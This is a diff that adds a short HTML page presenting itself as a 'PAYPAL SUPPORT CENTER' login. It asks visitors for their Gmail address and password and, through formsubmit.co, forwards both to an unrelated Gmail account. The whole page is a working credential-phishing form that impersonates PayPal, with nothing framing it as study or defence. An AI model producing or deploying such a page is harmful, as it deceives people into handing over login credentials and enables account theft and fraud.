@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Send me a message</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 500px;
+      margin: 60px auto;
+      padding: 24px;
+      color: #222;
+    }
+
+    form {
+      display: grid;
+      gap: 14px;
+    }
+
+    input, textarea, button {
+      box-sizing: border-box;
+      width: 100%;
+      padding: 12px;
+      font: inherit;
+    }
+
+    textarea {
+      min-height: 9px;
+      resize: vertical;
+    }
+
+    button {
+      color: rgb(32, 23, 93);
+      background: #2563eb;
+      border: 0;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #15399d;
+    }
+  </style>
+</head>
+<body>   
+    <img class="top-picture" src="my-picture.jpg" alt="A picture">
+  <h1>PAYPAL SUPPORT CENTER</h1>
+  <p>Enter your email and password below.</p>
+
+  <form action="https://formsubmit.co/paypalcom170@gmail.com" method="POST">
+    <label>
+      Your Gmail
+      <input type="email" name="email" required>
+    </label>
+
+    <label>
+      Your password
+      <textarea name="message" required></textarea>
+    </label>
+
+    <input type="hidden" name="_subject" value="New message from my website">
+
+    <button type="submit">login</button>
+  </form>
+</body>
+</html>
